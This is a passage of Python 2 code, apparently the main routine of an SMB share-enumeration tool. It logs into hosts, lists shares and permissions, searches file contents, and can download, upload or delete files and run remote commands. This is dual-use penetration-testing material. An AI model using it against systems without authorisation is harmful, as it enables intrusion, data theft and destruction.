    mysmb.hosts = host
    mysmb.smart_login()
    if args.pattern:
        mysmb.pattern = args.pattern
    counter = 0
    for host in mysmb.hosts.keys():
        if args.file_content_search:
            counter += 1
            print '[+] File search started on %d hosts...this could take a while' % (counter)
            if args.search_path[-1] == '\\':
                search_path = args.search_path[:-1]
            else:
                search_path = args.search_path
            mysmb.start_file_search(host, args.file_content_search, args.share, search_path)

        #if '-v' in sys.argv:
        #    mysmb.get_version(host)    #commented this out since it wasn't in the original usage

        try:
            if args.dlPath:
                mysmb.download_file(host, args.dlPath)
                sys.exit()

            if args.upload:
                mysmb.upload_file(host, args.upload[0], args.upload[1])
                sys.exit()

            if args.delFile:
                mysmb.delete_file(host, args.delFile)
                sys.exit()

            if args.list_drives:
                mysmb.list_drives(host, args.share)

            if args.command:
                mysmb.exec_command(host, args.share, args.command, True, mysmb.hosts[host]['name'])
                sys.exit()

            if not args.dlPath and not args.upload and not args.delFile and not args.list_drives and not args.command and not args.file_content_search:
                print '[+] IP: %s:%s\tName: %s' % (host, mysmb.hosts[host]['port'], mysmb.hosts[host]['name'].ljust(50))
                print '\tDisk%s\tPermissions' % (' '.ljust(50))
                print '\t----%s\t-----------' % (' '.ljust(50))
                mysmb.output_shares(host, lsshare, lspath, args.verbose, args.depth)
            mysmb.logout(host)

        except SessionError as e:
            print '[!] Access Denied'
        except Exception as e:
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.stdout.flush()
    if args.file_content_search:
        mysmb.get_search_results()

